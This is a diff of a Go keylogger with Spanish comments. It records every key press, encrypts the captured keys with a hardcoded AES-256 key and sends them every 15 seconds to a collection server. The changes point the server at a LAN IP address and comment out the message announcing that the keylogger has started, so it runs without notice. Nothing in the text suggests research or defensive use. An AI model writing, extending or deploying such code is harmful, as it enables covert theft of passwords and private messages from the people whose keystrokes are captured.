@@ -17,9 +17,9 @@ import (
 )
 
 var (
-	buffer        []string
-	encryptionKey = []byte("0123456789abcdef0123456789abcdef") // 32 bytes AES-256
-	serverURL     = "http://localhost:8080/recibir"            // Cambia por tu IP
+	keystrokes []string
+	securekey  = []byte("0123456789abcdef0123456789abcdef") // 32 bytes AES-256
+	serverURL  = "http://192.168.1.5:8080/recibir"
 )
 
 // Cifra el contenido con AES-256 GCM
@@ -53,13 +53,13 @@ func sendEncryptedData(ciphertext string) {
 
 // Guarda las teclas cada 15s, las cifra y las envía
 func saveAndSend() {
-	if len(buffer) == 0 {
+	if len(keystrokes) == 0 {
 		return
 	}
-	text := strings.Join(buffer, "")
-	buffer = []string{}
+	text := strings.Join(keystrokes, "")
+	keystrokes = []string{}
 
-	ciphered, err := encryptAES(text, encryptionKey)
+	ciphered, err := encryptAES(text, securekey)
 	if err != nil {
 		log.Println("Error al cifrar:", err)
 		return
@@ -90,15 +90,15 @@ func main() {
 		}
 	}()
 
-	fmt.Println("Keylogger con cifrado iniciado. Ctrl+C para salir.")
+	//fmt.Println("Keylogger con cifrado iniciado. Ctrl+C para salir.")
 
 	for e := range events {
 		if e.Type == keylogger.EvKey && e.KeyPress() {
 			key := e.KeyString()
 			if len(key) == 1 {
-				buffer = append(buffer, key)
+				keystrokes = append(keystrokes, key)
 			} else {
-				buffer = append(buffer, "["+key+"]")
+				keystrokes = append(keystrokes, "["+key+"]")
 			}
 		}
 	}
